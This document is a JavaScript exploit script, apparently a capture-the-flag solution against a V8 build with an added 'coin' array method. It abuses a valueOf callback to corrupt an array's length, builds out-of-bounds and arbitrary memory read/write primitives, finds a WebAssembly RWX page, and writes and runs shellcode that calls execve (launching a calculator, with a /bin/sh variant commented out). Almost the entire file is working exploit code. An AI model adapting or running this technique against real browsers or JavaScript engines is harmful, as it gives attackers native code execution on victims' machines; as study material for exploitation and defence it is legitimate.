function hexx(str, value){
    print("\033[32m[+]"+str+": \033[0m0x"+value.toString(16))
}

var raw_buf = new ArrayBuffer(8);
var d_buf = new Float64Array(raw_buf);
var l_buf = new BigInt64Array(raw_buf);

function d2l(x){
    d_buf[0] = x;
    return l_buf[0];
}
function l2d(x){
    l_buf[0] = x;
    return d_buf[0];
}

var x = {
    valueOf:function(){
        oob.length = 0x100;
        return 2.1729236899484e-311;
    }
}

let oob = [1.1, 1.2, 1.3, 1.4];
let mm1 = [1.1, 1.2, 1.3, 1.4, 1.1, 1.1, 1.1, 1.1];
let mm2 = [1.1, 1.1, 1.1];

let arr = [1.1];
// console.log('arr');
// %DebugPrint(arr);
// console.log('oob');
// %DebugPrint(oob);
// %SystemBreak();
//change oob.length=0x10, overwrite arr.length
//可能寻找backing_store_index
var arb_buf = new ArrayBuffer(0x100);
var arb = new DataView(arb_buf);
oob.coin(1, x);
// console.log('arr');
// %DebugPrint(arr);
// console.log('oob');
// %DebugPrint(oob);
// %SystemBreak();

if(arr[1023] == undefined){
    throw "FAILED to overwrite arr.length";
}else{
    hexx("arr.length", arr.length);
}

var tmp = [0xeabeef, arb_buf, arr];
var backing_store_index = -1n;
//use 0xeabeef find arb_buf_addr and arr_addr, (arb_buf_addr - arr_addr)/8 = arb_buf's offset of arr
for(let i = 0; i < 1023; i++){
    if(0x00eabeef00000000n == d2l(arr[i])){
        backing_store_index = (d2l(arr[i+1]) + 0x20n -1n - (d2l(arr[i+2]) - 0x8n - 1n)) / 8n;
        break;
    }
}
if(backing_store_index == -1n | backing_store_index > 1023n){
    throw "Error backing_store_index";
}
hexx('backing_store_index', backing_store_index);

function arb_read(addr)
{
    arr[backing_store_index] = l2d(addr);
    return arb.getBigInt64(0, true);
}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,
                                128,0,1,96,0,1,127,3,130,128,128,128,
                                0,1,0,4,132,128,128,128,0,1,112,0,0,5,
                                131,128,128,128,0,1,0,1,6,129,128,128,128,
                                0,0,7,145,128,128,128,0,2,6,109,101,109,111,
                                114,121,2,0,4,109,97,105,110,0,0,10,142,128,128,
                                128,0,1,136,128,128,128,0,0,65,239,253,182,245,125,11]);
var wasm_module = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_module);
var pwn = wasm_instance.exports.main;
//需要寻找rwxpage
tmp[0] = 0xdabeef;
tmp[1] = wasm_instance;

var wasm_instance_addr = -1n;
for(let i = 0; i < 1023; i++){
    if(0x00dabeef00000000n == d2l(arr[i])){
        wasm_instance_addr = d2l(arr[i+1]) - 1n;
        break;
    }
}
if(wasm_instance_addr == -1n){
    throw "Error wasm instance addr";
}

hexx('wasm_instanc_addr', wasm_instance_addr);

var rwx_addr = arb_read(wasm_instance_addr+0x88n);
hexx("rwx_addr", rwx_addr);

var calc = [
    72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
    96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
    105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
    72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
    72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
    184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
    94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5
];

var shellcode = [
    0x2fbb485299583b6an,
    0x5368732f6e69622fn,
    0x050f5e5457525f54n
];

arr[backing_store_index] = l2d(rwx_addr);


// for(let i = 0; i< shellcode.length; i++){
//     arb.setBigInt64(i*8, shellcode[i], true);
// }

for (let i = 0; i < calc.length; i++)
{
       arb.setUint8(i, calc[i]);
}

pwn();